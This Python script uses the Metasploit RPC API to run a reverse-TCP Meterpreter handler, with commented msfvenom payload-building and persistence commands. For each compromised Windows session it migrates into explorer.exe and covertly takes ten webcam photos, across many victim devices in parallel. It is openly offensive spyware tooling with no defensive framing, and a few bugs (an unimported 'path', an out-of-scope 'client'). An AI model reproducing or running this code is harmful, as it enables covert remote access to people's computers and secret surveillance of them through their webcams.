from pymetasploit3.msfrpc import MsfRpcClient
from pymetasploit3.msfconsole import MsfRpcConsole
import time
import os

import concurrent.futures	# Multiprocessing library


def image_capture(inp):
	m=1
	photo=0
	shell = client.sessions.session(inp)

	#shell.write('run persistence -U -i 5 -p 111 -r 192.168.0.106')
	shell.write('migrate -N explorer.exe')
	time.sleep(5)	
	#print(shell.read())

	if(m==1):
		# Directory for a particular device
		directory = "images/Device " + str(inp)
		
		if (path.exists(directory) == True):		# Checking if the directory exists
			while(photo<10):
				
				# Capturing and storing photos in the directory
				shell.write('webcam_snap 1 -p '+directory+'/'+str(photo)+'.jpeg -q 100 -v false ')	
				
				#print(shell.read())
				time.sleep(5)		# Capturing images at an interval of 5 seconds
				photo+=1
		
		else :
			os.mkdir(directory)		# Creating the directory for the device since it does not exist
			while(photo<10):
				shell.write('webcam_snap 1 -p '+directory+'/'+str(photo)+'.jpeg -q 100 -v false ')				
				#print(shell.read())
				time.sleep(5)
				photo+=1

		print("Pictures captured from Device "+inp)
		m=0
		


def capture():

	# Starting the Metasploit Framework
	#os.system('msfrpcd -P yourpassword11')

	# Payload Creation
	#os.system('msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.0.106 LPORT=333 -f exe > shell.exe')

	client = MsfRpcClient('yourpassword11', ssl=True)

	exploit = client.modules.use('exploit', 'multi/handler')
	exploit['ExitOnSession'] = False

	payload = client.modules.use('payload', 'windows/meterpreter/reverse_tcp')	
	payload['LHOST'] = '192.168.0.106'
	payload['LPORT'] = 333

	# Android payload
	# payload2 = client.modules.use('payload', 'android/meterpreter/reverse_tcp')	
	# payload2['LHOST'] = '192.168.0.106'
	# payload2['LPORT'] = 333

	count=0
	
	exploit.execute(payload=payload)

	#time.sleep()

	op="yes"
	#photo=0
	ids = []	# An array storing the IDs of the devices [to be used in multiprocessing]

	while(op=="yes"):
		x=client.sessions.list
		for i in range(1,100):
			try:
				print("id : - ",i ,"name : -" , x[str(i)]["info"])
				ids.append(i)		# IDs appended
			except:
				print("",end="")
				continue

		# inp =(input("Enter id : - "))
		l=0
		#m=0

		while(count<100):
			if(l==1):
				exploit.execute(payload=payload)
			try:
				l=1
				
				'''
				shell = client.sessions.session(inp)
				#shell.write('run persistence -U -i 5 -p 111 -r 192.168.0.106')
				shell.write('migrate -N explorer.exe')
				time.sleep(5)	
				#print(shell.read())

				if(m==1):
					while(photo<10):
						shell.write('webcam_snap 1 -p images/'+str(photo)+'.jpeg -q 100 -v false ')	
						
						#print(shell.read())
						time.sleep(5)
						photo+=1

					m=0
					op=(input("Want to continue : - "))
					os.system('clear')

					break
					'''
					
				# image_capture(inp)	
				
				# Initiating Multiprocessing
				with concurrent.futures.ProcessPoolExecutor() as executor:
					executor.map(image_capture, ids)
				
				op=(input("Want to continue : - "))
				os.system('clear')
				break	

				# m=1

			except:
				print("",end="")
			#time.sleep(5)
			count+=1
			photo=0

'''
if __name__ == "__main__":
	capture()
'''	
